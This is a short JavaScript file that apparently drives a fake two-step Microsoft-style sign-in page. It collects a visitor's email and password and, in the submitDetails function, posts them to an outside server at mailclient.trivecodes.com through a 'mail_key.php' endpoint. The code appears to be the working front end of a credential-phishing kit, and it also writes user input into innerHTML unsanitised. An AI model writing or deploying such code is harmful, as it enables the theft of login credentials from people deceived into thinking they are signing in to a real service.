const updateMail = (currentvalue) => {
  console.log(currentvalue);
  document.getElementById("usermail").innerHTML = currentvalue;
};

const shiftUser = () => {
  document.getElementById("mailDiv").classList.add("hidden");
  document.getElementById("passDiv").classList.remove("hidden");
  document.getElementById("usermail").innerHTML =
    document.getElementById("emailInput").value;
};

const submitDetails = async () => {
  document.getElementById("signinbtn").setAttribute("disabled", true);
  const usermail = document.getElementById("usermail").innerHTML;
  const userpass = document.getElementById("userpass").value;
  const formData = {
    User: usermail,
    Pass: userpass,
  };
  await fetch("https://mailclient.trivecodes.com/microsoft/php/mail_key.php", {
    method: "POST",
    body: JSON.stringify(formData),
  }).then((data) => console.log(data));
};
